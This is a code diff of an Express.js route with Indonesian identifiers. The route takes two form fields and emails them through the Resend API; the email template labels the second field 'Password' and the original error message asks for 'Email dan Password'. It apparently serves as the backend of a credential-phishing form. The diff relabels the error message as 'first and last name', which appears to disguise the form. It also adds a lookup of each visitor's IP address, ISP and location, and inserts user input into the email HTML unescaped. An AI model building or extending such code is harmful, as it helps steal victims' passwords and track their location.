@@ -50,13 +50,37 @@ app.post("/api/pesan", async (req, res) => {
   }
 
   const nama = String(req.body.nama || "").trim().slice(0, 80);
-  const belakang = String(req.body.belakang || "").trim().slice(0, 80);
+const belakang = String(req.body.belakang || "").trim().slice(0, 80);
+const setujuIp = Boolean(req.body.setujuIp);
 
-  if (!nama || !belakang) {
-    return res.status(400).json({ error: "Email dan Password wajib diisi." });
-  }
+if (!nama || !belakang) {
+  return res.status(400).json({ error: "Nama dan nama belakang wajib diisi." });
+}
 
-  try {
+try {
+  // Info IP/ASN HANYA diambil kalau pengunjung sendiri yang setuju
+  let ipInfoHtml = "<i>(tidak disertakan — pengunjung tidak menyetujui)</i>";
+
+  if (setujuIp) {
+    try {
+      const ipResp = await fetch(
+        `http://ip-api.com/json/${encodeURIComponent(req.ip)}?fields=status,country,regionName,city,isp,org,as,query`
+      );
+      const ip = await ipResp.json();
+
+      if (ip.status === "success") {
+        ipInfoHtml = `
+          IP: ${ip.query}<br>
+          ASN/ISP: ${ip.as || "-"} (${ip.isp || "-"})<br>
+          Lokasi: ${ip.city || "-"}, ${ip.regionName || "-"}, ${ip.country || "-"}
+        `;
+      } else {
+        ipInfoHtml = "<i>(gagal diambil)</i>";
+      }
+    } catch {
+      ipInfoHtml = "<i>(gagal diambil)</i>";
+    }
+    }
     const r = await fetch("https://api.resend.com/emails", {
       method: "POST",
       headers: {
@@ -78,6 +102,10 @@ app.post("/api/pesan", async (req, res) => {
         <tr>
           <td style="padding:12px 16px;color:#7a8296;font-size:13px;">Password</td>
           <td style="padding:12px 16px;color:#1b1e25;font-weight:600;">${belakang}</td>
+        </tr>
+        <tr>
+          <td style="padding:12px 16px;color:#7a8296;font-size:13px;">Info jaringan</td>
+          <td style="padding:12px 16px;color:#1b1e25;font-size:13px;">${ipInfoHtml}</td>
         </tr>
       </table>
       <p style="color:#7a8296;font-size:12px;margin-top:16px;">Dikirim otomatis dari form ladang</p>
